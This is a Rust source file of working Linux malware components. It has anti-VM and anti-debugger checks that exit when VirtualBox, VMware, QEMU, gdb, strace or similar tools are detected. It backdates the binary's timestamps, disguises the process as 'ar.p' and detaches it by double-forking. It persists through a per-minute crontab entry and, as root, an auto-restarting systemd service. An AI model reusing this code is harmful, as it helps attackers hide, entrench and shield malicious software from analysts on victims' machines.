#![allow(unused)]
use std::{env, fs, os::unix::process::CommandExt, path::Path, process::{self, exit, Command}};
use nix::{sys::{prctl, stat::utimes, time::TimeVal}, unistd::{fork, getuid, setsid}};


const VM: [&str; 5] =  ["vboxuser", "vboxguest", "vmware", "qemu", "hyperv"];
const DEBUG: [&str; 5] = ["gdb", "r2", "strace", "lldb", "ghidra"];
const PNAME: &str = "ar.p";


pub fn check_vm() {
  
    // Checking if (/dev) present or not and checking vm drivers present from (VM)
    match fs::read_dir("/dev") {
        Err(_) => {
                        println!("Failed to get /dev");
                        exit(0);
                    },
        Ok(s) => { 
                                for file in s {
                                    
                                    let file = file.unwrap().file_name().to_string_lossy().into_owned();
                                    if VM.iter().any(|&v| v == file) {
                                        println!("Exiting vm driver detected");
                                        exit(0);
                                    }

                                }
                            } 
    }
}


pub fn check_debugger() {
 
    // Getting process status
    let status = fs::read_to_string("/proc/self/status").unwrap();

    // Getting ppid 
    let ppid = status.lines()
        .find(|&l| l.starts_with("PPid:"))
        .and_then(|l| l.split_whitespace().nth(1))
        .unwrap();

    // Getting debugger name
    let debugger = fs::read_link(format!("/proc/{}/exe", ppid)).unwrap().to_string_lossy().into_owned();

    for dbg in DEBUG {
        if debugger.contains(dbg) {
            println!("Exiting debugger detected");
            exit(0);
        }
    }
}


pub fn time_stomp() {

    // Changing time value of access and modified
    let atime = TimeVal::new(946_684_800, 0);  
    let mtime = TimeVal::new(946_684_800, 0);
   
    let path = env::current_exe().unwrap();
    
    // Updating timestamp 
    utimes(&path, &atime, &mtime).unwrap();

    println!("TimeStomped to 2000-01-01")

}


pub fn process_stomp() {
   
    // Using prctl to set name for process
    prctl::set_name(&std::ffi::CString::new(PNAME).unwrap()).unwrap();

    // Overwritting the argv[0] index
    let args: Vec<_> = env::args().collect();
    if args.get(0).map(|s| s.as_str()).unwrap() != PNAME {
        let _ = Command::new("/proc/self/exe").arg0(PNAME).exec();
    }

    // Creating the child process
    if unsafe{ fork().unwrap() }.is_parent() {
        exit(0);
    }

    // Removing tty
    setsid().unwrap();

    // Revoking the session leader
    if unsafe{ fork().unwrap() }.is_parent() {
        exit(0);
    }
    
    println!("Binary:({}) having pid({}) is spoofed to:({})", env!("CARGO_BIN_NAME"), process::id(), PNAME);
}


pub fn persistance() {
    
    if getuid().to_string() == "0" {
        println!("Applying system level persistence");
        crontab();
        systemd();
    } else {
        println!("Applying user level persistence");
        crontab();
    }

}


fn crontab() {

    let expression = format!("* * * * * {}\n", env::current_exe().unwrap().to_string_lossy().to_owned());
    let mut file = env::current_dir().unwrap().to_string_lossy().into_owned();
    file.push_str("/cron");

    let output = Command::new("crontab").arg("-l").output().unwrap();
    let mut task = String::from_utf8(output.stdout).unwrap().trim().to_string();
 
    if !task.contains(&expression.trim()) {
    
        if !task.is_empty() {
            task += "\n";    
        }
        
        task += expression.as_str();
        fs::write(&file, &task).unwrap();

        Command::new("crontab").arg(&file).output().unwrap();
        fs::remove_file(file).unwrap();
    }

}


fn systemd() {
    
    let service = format!(
                                    "[Unit]
                                Description=ar.p

                                [Service]
                                Type=simple
                                User=root
                                WorkingDirectory={}
                                ExecStart={}
                                Restart=always
                                RestartSec=3

                                [Install]
                                WantedBy=multi-user.target",
                                env::current_dir().unwrap().to_string_lossy().into_owned(), 
                                env::current_exe().unwrap().to_string_lossy().into_owned()
                            );

    fs::write("/etc/systemd/system/ar.p.service", service).unwrap();
    Command::new("systemctl")
            .args(["enable","ar.p"])
            .spawn()
            .unwrap();

}



